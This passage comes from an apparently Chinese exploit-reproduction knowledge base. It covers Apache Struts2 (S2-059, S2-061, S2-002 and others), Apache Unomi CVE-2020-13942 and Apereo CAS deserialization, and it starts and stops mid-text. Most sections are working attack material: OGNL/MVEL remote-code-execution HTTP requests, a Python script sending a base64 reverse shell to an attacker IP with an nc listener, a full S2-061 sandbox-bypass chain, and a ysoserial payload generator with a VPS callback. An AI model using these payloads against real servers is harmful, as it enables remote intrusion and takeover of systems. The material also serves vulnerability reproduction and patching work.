会对某些特定的标签的属性值，比如id属性进行二次解析，所以攻击者可以传递将在呈现标签属性时再次解析的OGNL表达式，造成OGNL表达式注入。从而可能造成远程执行代码。 0x03 影响版本 Struts 2.0.0 – Struts 2.5.20 0x04 环境搭建 攻击机：linux:192.168.20.128 靶机：Ubuntu:192.168.20.129 1、启动 Struts 2.5.16环境: docker-compose up -d 2、启动环境之后访问http://your-ip:8080/?id=1 就可以看到测试界面 0x05 漏洞复现 1、访问 http://your-ip:8080/?id=%25%7B233*233%7D 可以发现233*233的结果被解析到了id属性中可以看到通过构造恶意的OGNL表达式，并将其设置到可被外部输入进行修改，且会执行OGNL表达式的Struts2标签的属性值，引发OGNL表达式解析。 2、对poc进行了修改，反弹shell import requests url = \"http://127.0.0.1:8080\" data1 = { \"id\": \"%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}\" } data2 = { \"id\": \"%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwLjEyOC82NjY2IDA+JjE=}|{base64,-d}|{bash,-i}'))}\" } res1 = requests.post(url, data=data1) # print(res1.text) res2 = requests.post(url, data=data2) # print(res2.text) 这里exec()函数里是我们要执行的命令，我们进行linux反弹shell命令 bash -i >& /dev/tcp/192.168.20.128/6666 0>&1 （PS：这里经过水木逸轩大佬指点了解到反弹shell涉及到管道符问题于是要将命令进行base64编码） base64在线编码： https://ares-x.com/tools/runtime-exec/ 3、在攻击机监听本地端口：nc -lvvp 6666 运行脚本成功反弹回shell 0x06 修复建议 1.Struts官方已经发布了新版本修复了上述漏洞，请受影响的用户尽快升级进行防护。 2.若不方便升级的用户，可以参考Struts官方提供的缓解措施： 将输入参数的值重新分配给某些Struts的标签属性时，请始终对其进行验证。 考虑激活Proactive OGNL Expression Injection Protection。 参考链接：http://blog.nsfocus.net/struts-s2-0813/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:36 "},"Web安全/Apache Struts/（CVE-2019-0230）s2-09/（CVE-2019-0230）s2-09.html":{"url":"Web安全/Apache Struts/（CVE-2019-0230）s2-09/（CVE-2019-0230）s2-09.html","title":"（CVE-2019-0230）s2-09","keywords":"","body":"（CVE-2019-0230）s2-09 一、漏洞简介 利用条件 漏洞利用前置条件，需要特定标签的相关属性存在表达式%{xxxxx}，且xxxx可控并未做安全验证。 Struts2标签的属性值可执行OGNL表达式``Struts2标签的属性值可被外部输入修改``Sruts2标签的属性值未经安全验证 二、漏洞影响 Apache Struts 2.0.0版本至2.5.20版本 三、复现过程 POST /test/test.action HTTP/1.1 Host: www.0-sec.org:8080 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: JSESSIONID=48FCD5D2DFB1E3CDF753E62011186CBC Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 576 id=%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess.acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess.acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%23a.exec('ls%20-al').getInputStream()).useDelimiter('%5C%5C%5C%5CA')%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A''%2C%23res.print(%23str)%2C%23res.close()%0A%7d Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:37 "},"Web安全/Apache Struts/（CVE-2020-17530）S2-061/（CVE-2020-17530）S2-061.html":{"url":"Web安全/Apache Struts/（CVE-2020-17530）S2-061/（CVE-2020-17530）S2-061.html","title":"（CVE-2020-17530）S2-061","keywords":"","body":"（CVE-2020-17530）S2-061 漏洞描述 本次漏洞是对S2-059漏洞修复后的绕过。S2-059的修复补丁仅修复了沙盒绕过，但是并没有修复OGNL表达式的执行。但是在最新版本2.5.26版本中OGNL表达式的执行也修复了。 漏洞影响版本 struts 2.0.0 - struts 2.5.25 漏洞分析 本文仅是对S2-061进行复现，并且对复现的过程进行记录，具体的分析思路可以参考 安恒信息安全研究院-Struts2 S2-061漏洞分析(CVE-2020-17530) Smi1e师傅tql 膜了 呜呜呜 漏洞复现 测试环境 IDEA 2019.3.5 Struts2 2.5.26/Struts2 2.3.33 Apache-Tomcat-8.5.57 相关依赖包 注意，搭建测试环境的时候，除了下载struts2的最小依赖包(struts-2.x.xx-min-lib.zip)以外，本次的环境，还需要依赖同版本包下的commons-collections-x.x.jar，可以在struts-2.x.xx-lib.zip中找到版本对应的包，后续会说明为什么一定需要这个包。 2.3.3相关依赖包 2.5.25相关依赖包 复现思路简略说明（具体思路请移步上文中的漏洞分析文章） 首先找到struts2标签解析的入口，也是我们本次漏洞Debug跟踪的重点。 全方法名：org.apache.struts2.views.jsp.ComponentTagSupport#doStartTag 这里是标签解析的开始方法，同时这里能够观测到整个OgnlValueStack对象，也是我们开始寻找利用点的地方。 其中我们本次要使用的利用点就stack中断点可以找到（这一步在前面的思路分析中可以找到，但是因为debug点没有描述清楚，一开始找了很久，最后在查阅其他版本的文章分析才找到这个位置）: 从上文中的位置，我们可以得到获取这个对象的获取调用链，如下图 转换为ognl表达式后如下：#application.get('org.apache.tomcat.InstanceManager') org.apache.catalina.core.DefaultInstanceManager 的方法不做过多描述，借用分析文章中的一张图，可以使用这个对象中的newInstance方法实例化任意无参构造方法的类并返回。 创建org.apache.commons.collections.BeanMap对象(本次的漏洞复现的主角，同时这个包就在commons-collections-x.x.jar中) API简要描述（若想看详细方法分析，请移步到上文的分析文章）: Object get(\"xxxx\") 实际相当于调用内部对象的getXxx,比如getName() Object put(\"xxxx\",Object) 实际相当于调用内部对象的,setXxxx,比如setName() void setBean(Object) 重新设置内部对象，设置完成后上面两个才能生效 Object getBean() 获取内部对象，这里可以在断点的时候查看到当前map中的实际对象 整体创建的Ognl表达式（这里存放到application中，方便多次请求使用） %{#application.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')} 获取到OgnlContext对象 （实际就是#attr 、#request 等map对象中的 struts.valueStack）并且设置到上一步的BeanMap中，用于绕过沙盒限制，进行内部方法调用。 Ognl表达式代码 %{#application.map.setBean(#request.get('struts.valueStack'))} 使用3和4同样的原理，利用 BeanMap使用com.opensymphony.xwork2.ognl.OgnlValueStack 中的 getContext 方法间接获取到 OgnlContext,并且重新设置到一个新的BeanMap中。 这里把两个步骤的Ognl代码同时贴出来 # 注意，自行调试的话，需要分两次执行 %{#application.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')} %{#application.map2.setBean(#application.get('map').get('context'))} 使用上面的原理，使用第二步得到的OgnlContext获取到内部的com.opensymphony.xwork2.ognl.SecurityMemberAccess对象，在设置到新的BeanMap中，用于重置黑名单 # 注意，自行调试的话，需要分两次执行 %{#application.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')} %{#application.map3.setBean(#application.get('map2').get('memberAccess'))} 确认一下之前存放的Map都正确存下来了，不然岂不是白忙活，其实每一步执行完后，都可以查看一次，确认每一步都是操作正确的，这里我就一次过了。 前面的操作都确认没有问题后，就可以调用方法重置黑名单了，主要API为com.opensymphony.xwork2.ognl.SecurityMemberAccess#setExcludedClasses和com.opensymphony.xwork2.ognl.SecurityMemberAccess#setExcludedPackageNames,如下图 在我们这两个地方打了断点后，我们请求下面或者前面的ognl可以发现，在每次收到请求的时候，都会调用一次这里的黑名单赋值，也就是说，就算是我们在本次请求重置了黑名单，在下次请求的时候，黑名单还是会重置。因此只有前面的ognl可以持久化存储，实际利用的时候，必须要在一个请求中进行命令执行。下文还会有一个存放在request中的poc。 初次请求赋值: 执行下面清空黑名单代码的重新赋值 清7空黑名单的ognl代码 # 注意，自行调试的话，需要分两次执行 #application.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) #application.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) 这里就可以使用黑名单中的freemarker.template.utility.Execute类中的exec方法执行Shell了。需要最少和前面的8一起使用，才能执行成功。可以直接使用最后面的完整poc代码执行。 执行shell的ognl代码 #application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'calc.exe'}) 完整POC 使用application，就是上面思路的完整POC %{ (#application.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + (#application.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + (#application.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + (#application.map2.setBean(#application.get('map').get('context')) == true).toString().substring(0,0) + (#application.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + (#application.map3.setBean(#application.get('map2').get('memberAccess')) == true).toString().substring(0,0) + (#application.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + (#application.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + (#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'calc.exe'})) } 使用request，单次请求有效的完整POC (推荐) %{ (#request.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + (#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + (#request.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + (#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) + (#request.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + (#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) + (#request.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + (#request.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + (#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'calc.exe'})) } 注意：请使用url对以上的OGNL代码编码后，再在工具上使用。 检测思路 在新版本的struts2中，已经不能通过参数构造来解析ognl表达式了，所以如果考虑想要使用脚本来进行批量扫描是否有本漏洞的时候，可以考虑直接爆破所有参数，然后判断页面中是否有预计的结果文本即可。 比如： %{ ‘gcowsec-‘ + (2000 + 20).toString()} 预计会得到 gcowsec-2020 使用脚本判断结果中是否包含就可以了 总结 此次漏洞只是S2-059修复的一个绕过，并且本次利用的核心类org.apache.commons.collections.BeanMap在commons-collections-x.x.jar包中，但是在官方的最小依赖包中并没有包含这个包。所以即使扫到了支持OGNL表达式的注入点，但是如果没有使用这个依赖包，也还是没办法进行利用。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:38 "},"Web安全/Apache Struts/（CVE-xxxx-xxxx）s2-002/（CVE-xxxx-xxxx）s2-002.html":{"url":"Web安全/Apache Struts/（CVE-xxxx-xxxx）s2-002/（CVE-xxxx-xxxx）s2-002.html","title":"（CVE-xxxx-xxxx）s2-002","keywords":"","body":"（CVE-xxxx-xxxx）s2-002 一、漏洞简介 对于和标签，可以在构造和呈现标签的结果URL时注入不能正确转义的参数值。以下情况是已知的： 构造结果中包含的参数值可以注入未转义的双引号，从而可以通过转义已渲染的href属性来在生成的HTML中注入代码。 当includeParams设置为“none”的任何其他值时，和标签无法转义标签，可以通过使用GET参数调用包含JSP /动作来利用 二、漏洞影响 Struts 2.0.0 - Struts 2.0.11 三、复现过程 poc http://www.0-sec.org:8080/index.action?\">alert(1)alert(1)test=hello Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:38 "},"Web安全/Apache Struts/Apache Struts 漏洞列表快速查阅/Apache Struts 漏洞列表快速查阅.html":{"url":"Web安全/Apache Struts/Apache Struts 漏洞列表快速查阅/Apache Struts 漏洞列表快速查阅.html","title":"Apache Struts 漏洞列表快速查阅","keywords":"","body":"Apache Struts 漏洞列表快速查阅 S2-001 --- Remote code exploit on form validation error S2-002 --- Cross site scripting (XSS) vulnerability on \\ and \\ tags S2-003 --- XWork ParameterInterceptors bypass allows OGNL statement execution S2-004 --- Directory traversal vulnerability while serving static content S2-005 --- XWork ParameterInterceptors bypass allows remote command execution S2-006 --- Multiple Cross-Site Scripting (XSS) in XWork generated error pages S2-007 --- User input is evaluated as an OGNL expression when there\\'s a conversion error S2-008 --- Multiple critical vulnerabilities in Struts2 S2-009 --- ParameterInterceptor vulnerability allows remote command execution S2-010 --- When using Struts 2 token mechanism for CSRF protection, token check may be bypassed by misusing known session attributes S2-011 --- Long request parameter names might significantly promote the effectiveness of DOS attacks S2-012 --- Showcase app vulnerability allows remote command execution S2-013 --- A vulnerability, present in the includeParams attribute of the URL and Anchor Tag, allows remote command execution S2-014 --- A vulnerability introduced by forcing parameter inclusion in the URL and Anchor Tag allows remote command execution, session access and manipulation and XSS attacks S2-015 --- A vulnerability introduced by wildcard matching mechanism or double evaluation of OGNL Expression allows remote command execution. S2-016 --- A vulnerability introduced by manipulating parameters prefixed with \\\"action:\\\"/\\\"redirect:\\\"/\\\"redirectAction:\\\" allows remote command execution S2-017 --- A vulnerability introduced by manipulating parameters prefixed with \\\"redirect:\\\"/\\\"redirectAction:\\\" allows for open redirects S2-018 --- Broken Access Control Vulnerability in Apache Struts2 S2-019 --- Dynamic Method Invocation disabled by default S2-020 --- Upgrade Commons FileUpload to version 1.3.1 (avoids DoS attacks) and adds \\'class\\' to exclude params in ParametersInterceptor (avoid ClassLoader manipulation) S2-021 --- Improves excluded params in ParametersInterceptor and CookieInterceptor to avoid ClassLoader manipulation S2-022 --- Extends excluded params in CookieInterceptor to avoid manipulation of Struts\\' internals S2-023 --- Generated value of token can be predictable S2-024 --- Wrong excludeParams overrides those defined in DefaultExcludedPatternsChecker S2-025 --- Cross-Site Scripting Vulnerability in Debug Mode and in exposed JSP files S2-026 --- Special top object can be used to access Struts\\' internals S2-027 --- TextParseUtil.translateVariables does not filter malicious OGNL expressions S2-028 --- Use of a JRE with broken URLDecoder implementation may lead to XSS vulnerability in Struts 2 based web applications. S2-029 --- Forced double OGNL evaluation, when evaluated on raw user input in tag attributes, may lead to remote code execution. S2-030 --- Possible XSS vulnerability in I18NInterceptor S2-031 --- XSLTResult can be used to parse arbitrary stylesheet S2-032 --- Remote Code Execution can be performed via method: prefix when Dynamic Method Invocation is enabled. S2-033 --- Remote Code Execution can be performed when using REST Plugin with ! operator when Dynamic Method Invocation is enabled. S2-034 --- OGNL cache poisoning can lead to DoS vulnerability S2-035 --- Action name clean up is error prone S2-036 --- Forced double OGNL evaluation, when evaluated on raw user input in tag attributes, may lead to remote code execution (similar to S2-029) S2-037 --- Remote Code Execution can be performed when using REST Plugin. S2-038 --- It is possible to bypass token validation and perform a CSRF attack S2-039 --- Getter as action method leads to security bypass S2-040 --- Input validation bypass using existing default action method. S2-041 --- Possible DoS attack when using URLValidator S2-042 --- Possible path traversal in the Convention plugin S2-043 --- Using the Config Browser plugin in production S2-044 --- Possible DoS attack when using URLValidator S2-045 --- Possible Remote Code Execution when performing file upload based on Jakarta Multipart parser. S2-046 --- Possible RCE when performing file upload based on Jakarta Multipart parser (similar to S2-045) S2-047 --- Possible DoS attack when using URLValidator (similar to S2-044) S2-048 --- Possible RCE in the Struts Showcase app in the Struts 1 plugin example in Struts 2.3.x series S2-049 --- A DoS attack is available for Spring secured actions S2-050 --- A regular expression Denial of Service when using URLValidator (similar to S2-044 & S2-047) S2-051 --- A remote attacker may create a DoS attack by sending crafted xml request when using the Struts REST plugin S2-052 --- Possible Remote Code Execution attack when using the Struts REST plugin with XStream handler to handle XML payloads S2-053 --- A possible Remote Code Execution attack when using an unintentional expression in Freemarker tag instead of string literals S2-054 --- A crafted JSON request can be used to perform a DoS attack when using the Struts REST plugin S2-055 --- A RCE vulnerability in the Jackson JSON library S2-056 --- A crafted XML request can be used to perform a DoS attack when using the Struts REST plugin S2-057 --- Possible Remote Code Execution when alwaysSelectFullNamespace is true (either by user or a plugin like Convention Plugin) and then: results are used with no namespace and in same time, its upper package have no or wildcard namespace and similar to results, same possibility when using url tag which doesn't have value and action set and in same time, its upper package have no or wildcard namespace. S2-058 --- Previous Security Bulletins contained incorrect affected release version ranges. Struts2 S2-059 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:22 "},"Web安全/Apache Unomi/Apache Unomi远程代码执行漏洞复现-CVE-2020-13942/Apache Unomi远程代码执行漏洞复现-CVE-2020-13942.html":{"url":"Web安全/Apache Unomi/Apache Unomi远程代码执行漏洞复现-CVE-2020-13942/Apache Unomi远程代码执行漏洞复现-CVE-2020-13942.html","title":"Apache Unomi远程代码执行漏洞复现-CVE-2020-13942","keywords":"","body":"Apache Unomi远程代码执行漏洞复现-CVE-2020-13942 简介 Apache Unomi 是一个基于标准的客户数据平台（CDP，Customer Data Platform），用于管理在线客户和访客等信息，以提供符合访客隐私规则的个性化体验。在Apache Unomi 1.5.1级以前版本中，存在一处表达式注入漏洞，远程攻击者通过MVEL和OGNL表达式即可在目标服务器上执行任意命令。 CVE-2020-13942漏洞是对CVE-2020-11975漏洞的补丁绕过，攻击者绕过补丁检测的黑名单，发送恶意请求，并在服务器执行任意代码 影响版本 Apache Unomi 漏洞复现 通过8181和9443两个端口均可触发漏洞，以下以8181为例。 有两种利用方式： 通过MVEL表达式执行任意命令： POST /context.json HTTP/1.1 Host: localhost:8181 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 Connection: close Content-Type: application/json Content-Length: 483 { \"filters\": [ { \"id\": \"sample\", \"filters\": [ { \"condition\": { \"parameterValues\": { \"test\": \"script::Runtime r = Runtime.getRuntime(); r.exec(\\\"ping 79jk3a.dnslog.cn\\\");\" }, \"type\": \"profilePropertyCondition\" } } ] } ], \"sessionId\": \"sample\" } 通过OGNL表达式执行任意命令： POST /context.json HTTP/1.1 Host: localhost:8181 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 Connection: close Content-Type: application/json Content-Length: 1064 { \"personalizations\":[ { \"id\":\"gender-test\", \"strategy\":\"matching-first\", \"strategyOptions\":{ \"fallback\":\"var2\" }, \"contents\":[ { \"filters\":[ { \"condition\":{ \"parameterValues\":{ \"propertyName\":\"(#runtimeclass = #this.getClass().forName(\\\"java.lang.Runtime\\\")).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\\\"getRuntime\\\")}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\\\"exec\\\")}.{? #this.getParameters()[0].getType().getName().equals(\\\"java.lang.String\\\")}.{? #this.getParameters().length 运行如下命令启动一个Apache Unomi 1.5.1的服务器：docker-compose up -d 直接在首页抓包，把内容替换成上面任意一种POC即可 目标出网测试 进行反弹shell，将bash -i >& /dev/tcp/192.168.1.41/7777 0>&1进行编码，地址：http://www.jackson-t.ca/runtime-exec-payloads.html 获取shell 修复建议 更新最新版本 参考 https://mp.weixin.qq.com/s/le1lir9x8v9cVf14V4oCPg Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:39 "},"Web安全/Apereo CAS/Apereo CAS 4.X execution参数反序列化漏洞/Apereo CAS 4.X execution参数反序列化漏洞.html":{"url":"Web安全/Apereo CAS/Apereo CAS 4.X execution参数反序列化漏洞/Apereo CAS 4.X execution参数反序列化漏洞.html","title":"Apereo CAS 4.X execution参数反序列化漏洞","keywords":"","body":"Apereo CAS 4.X execution参数反序列化漏洞 一、漏洞简介 该攻击媒介特别适用于CAS的所有部署v4.1.x和v4.2.x地方中科院外的开箱默认配置用于管理对象序列化，数据加密和签名部署 二、漏洞影响 Apereo CAS 4.1.x - 4.16 Apereo CAS 4.1.7 - 4.2x 三、复现过程 在 cas-servlet.xml 中，可以知道对execution参数应该关注 FlowExecutorImpl 在 org/springframework/webflow/executor/FlowExecutorImpl.class:96 public FlowExecutionResult resumeExecution(String flowExecutionKey, ExternalContext context) throws FlowException { FlowExecutionResult var6; try { ... try { FlowExecution flowExecution = this.executionRepository.getFlowExecution(key); ... } ... } ... } 跟进 getFlowExecution，在 spring-webflow-client-repo-1.0.0.jar!/org/jasig/spring/webflow/plugin/ClientFlowExecutionRepository.class:51 public FlowExecution getFlowExecution(FlowExecutionKey key) throws FlowExecutionRepositoryException { ... byte[] encoded = ((ClientFlowExecutionKey)key).getData(); try { ClientFlowExecutionRepository.SerializedFlowExecutionState state = (ClientFlowExecutionRepository.SerializedFlowExecutionState)this.transcoder.decode(encoded); ... } } 跟进 decode spring-webflow-client-repo-1.0.0.jar!/org/jasig/spring/webflow/plugin/EncryptedTranscoder.class:80 public Object decode(byte[] encoded) throws IOException { byte[] data; try { data = this.cipherBean.decrypt(encoded); } catch (Exception var11) { throw new IOException(\"Decryption error\", var11); } ByteArrayInputStream inBuffer = new ByteArrayInputStream(data); ObjectInputStream in = null; Object var5; try { if (this.compression) { in = new ObjectInputStream(new GZIPInputStream(inBuffer)); } else { in = new ObjectInputStream(inBuffer); } var5 = in.readObject(); } catch (ClassNotFoundException var10) { throw new IOException(\"Deserialization error\", var10); } finally { if (in != null) { in.close(); } } return var5; } post进入的execution参数值即encoded，在经过decrypt解密后，最终在var5 = in.readObject()触发反序列化漏洞。 Apereo CAS 4.1.X ~ 4.1.6 漏洞复现 4.1.x 的加密过程直接利用了EncryptedTranscoder中的encode public class EncryptedTranscoder implements Transcoder { private CipherBean cipherBean; private boolean compression = true; public EncryptedTranscoder() throws IOException { BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean(); bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec(\"AES\", \"CBC\", \"PKCS7\")); bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore()); bufferedBlockCipherBean.setKeyAlias(\"aes128\"); bufferedBlockCipherBean.setKeyPassword(\"changeit\"); bufferedBlockCipherBean.setNonce(new RBGNonce()); this.setCipherBean(bufferedBlockCipherBean); } ... public byte[] encode(Object o) throws IOException { if (o == null) { return new byte[0]; } else { ByteArrayOutputStream outBuffer = new ByteArrayOutputStream(); ObjectOutputStream out = null; try { if (this.compression) { out = new ObjectOutputStream(new GZIPOutputStream(outBuffer)); } else { out = new ObjectOutputStream(outBuffer); } out.writeObject(o); } finally { if (out != null) { out.close(); } } try { return this.cipherBean.encrypt(outBuffer.toByteArray()); } catch (Exception var7) { throw new IOException(\"Encryption error\", var7); } } } ... protected KeyStore createAndPrepareKeyStore() { KeyStoreFactoryBean ksFactory = new KeyStoreFactoryBean(); URL u = this.getClass().getResource(\"/etc/keystore.jceks\"); ksFactory.setResource(new URLResource(u)); ksFactory.setType(\"JCEKS\"); ksFactory.setPassword(\"changeit\"); return ksFactory.newInstance(); } } 同时要注意存在一个base64的过程 因此要生成payload，即先用encode加密后再进行一次base64编码。其中/etc/keystore.jceks在spring-webflow-client-repo-1.0.0.jar/etc/目录下 生成payload import org.cryptacular.util.CodecUtil; import org.jasig.spring.webflow.plugin.EncryptedTranscoder; import ysoserial.payloads.ObjectPayload; public class ApereoExploit { public static void main(String[] args) throws Exception{ String poc[] = {\"CommonsCollections2\",\"bash-shell\"}; final Object payloadObject = ObjectPayload.Utils.makePayloadObject(poc[0], poc[1]); //AES加密 EncryptedTranscoder et = new EncryptedTranscoder(); byte[] encode = et.encode(payloadObject); //base64编码 System.out.println(CodecUtil.b64(encode)); } } 运行代码 接着 服务器监听： 完整过程动图 Apereo CAS 4.1.7 ～ 4.2.X 漏洞复现 以4.2.7为例。 利用 4.2.x 的decrypt函数在 cas-server-webapp-support-4.2.7.jar!/org/jasig/cas/web/flow/CasWebflowCipherBean.class:34 public byte[] decrypt(byte[] bytes) { return (byte[])this.webflowCipherExecutor.decode(bytes); } 其中decode在 cas-server-core-util.jar!/jasig/cas/util/BinaryCipherExecutor.java:82 @Override public byte[] encode(final byte[] value) { try { final Key key = new SecretKeySpec(this.encryptionSecretKey.getBytes(), this.secretKeyAlgorithm); final CipherService cipher = new AesCipherService(); final byte[] result = cipher.encrypt(value, key.getEncoded()).getBytes(); return sign(result); } catch (final Exception e) { logger.error(e.getMessage(), e); throw new RuntimeException(e); } } @Override public byte[] decode(final byte[] value) { try { final byte[] verifiedValue = verifySignature(value); final Key key = new SecretKeySpec(this.encryptionSecretKey.getBytes(UTF8_ENCODING), this.secretKeyAlgorithm); final CipherService cipher = new AesCipherService(); final byte[] result = cipher.decrypt(verifiedValue, key.getEncoded()).getBytes(); return result; } catch (final Exception e) { logger.error(e.getMessage(), e); throw new RuntimeException(e); } } 而上面encode其对应的调用加密流程在 cas-server-core-util.jar!/org/jasig/cas/util/WebflowCipherExecutor.java:14 @Component(\"webflowCipherExecutor\") public class WebflowCipherExecutor extends BinaryCipherExecutor { /** * Instantiates a new webflow cipher executor. * * @param secretKeyEncryption the secret key encryption * @param secretKeySigning the secret key signing * @param secretKeyAlg the secret key alg */ @Autowired public WebflowCipherExecutor(@Value(\"${webflow.encryption.key:}\") final String secretKeyEncryption, @Value(\"${webflow.signing.key:}\") final String secretKeySigning, @Value(\"${webflow.secretkey.alg:AES}\") final String secretKeyAlg){ super(secretKeyEncryption, secretKeySigning); setSecretKeyAlgorithm(secretKeyAlg); } } 因此其加密过程与 4.1.X稍微有些不同，需要重新写加密逻辑。 复现 利用 cas-overlay-template-4.2 ，其中在cas-overlay-template-4.2\\cas-overlay-template-4.2\\src\\main\\webapp\\WEB-INF\\spring-configuration\\propertyFileConfigurer.xml 指定了cas.properties 的位置，最终生成war包，放于Tomcat webapps目录下。 修改cas.properties，使其支持http，并修改webflow相关默认密钥 webflow.encryption.key=C4SBogp_badO82wC webflow.signing.key=8_G6JMTdkxiJ5rN0tqFrEOQj200VoxGrRzAp7bvjMFSGdA2IOzdFRsGv3m3GMNVmoSJ0O4miIBrYCHx_FWP4oQ 利用 apereocas42.jar 生成加密参数，由于依赖包中存在c3p0 因此可以利用其做gadget java -jar apereocas42.jar C4SBogp_badO82wC 8_G6JMTdkxiJ5rN0tqFrEOQj200VoxGrRzAp7bvjMFSGdA2IOzdFRsGv3m3GMNVmoSJ0O4miIBrYCHx_FWP4oQ C3P0 http://your_vps:60006/:Exploit execution=7995ec15-cec8-4eed-9d31-d9a1f7a7138b_ZXlKaGJHY2lPaUpJVXpVeE1pSjkuTVM5aVdUaEtiSE4zVW1KYVZqUXJielZoZFV4V1FWZExUVGRPVUdsblZYVk9hbkZaTUVwdWNUbE1hekpMTVUxeGQyaHVhRkJwY3pacVluZ3ZWVTVNTDBKdVFsUnpkMUIxYW5kVlZUWjRVMDloUlN0SGVUVjZjbXRGYkU5Rk5tNXNUa3R5UVdNMVUwRXpkSFpYYWs4NVpuRjFWUzg0YVZWcmFVaDRUeXRIV1ZFMU5GVXZZV0pSVDJGSmQwaGxkSFZNWlc5VFRsRTNNbE5WSzBjMVFXazFiV2h2V2tWMFVtZEVaVE0zZVhSeldsbDVLMjQwUzJSM1YzSllhemxLV0dRclRuWk5lSE4xZURKM2NIazJRMHBXYkVOS01UVnZURlZEU2tKMU5rMVRaVll3ZVV4VmFHWlBkVzlUZFhCYVpYaFFiV1pwY1hSV1YzVnhMMUIxV0dSWFYxaFhRVGt6ZUZKSGVGcDNTSFZYTkUxRVpVRjFLM1pDU1hWWFQzZG1我是马赛克pT1ZKSVZHNXVUMlpCVFdWdGFGSmFTV0pyWjJWTGJsUnFXVXhVYTA5UUx6QnVLM2xTZVdoQ1NGaDBja3d3VFVab056UTFValJ2VFUwNGNpODRPRXhFVjFKR2VHdEtaSGxNWjFScVdVRnRkMHRIUW00dk5HOHZiR0p0WjBSeVVHdElUbWhIVm1ORVoxSkdlRzlQYm5vMmFXaHVkWEpPVEdaa1kzWXlVMHB3Vm1GSFEwTkZXR3cwZW1Jd1dVSkhjRTlCVUVwUldXZ3ZNRmxaTkVGb09FMXlNRlpGY2t4NFlXUnhTR2QzYmxwSVRVUjFNM2hMT1VOQ2NGRnRWWEo0T1RKRE1ETm1NbmhDTVdwdGRUSktkR3Q1WVc1WmJsZFdVMjlKUm1jMWVERlpXbGg1V1hWclRHZGpXa1Y1VVVOSk5sQlV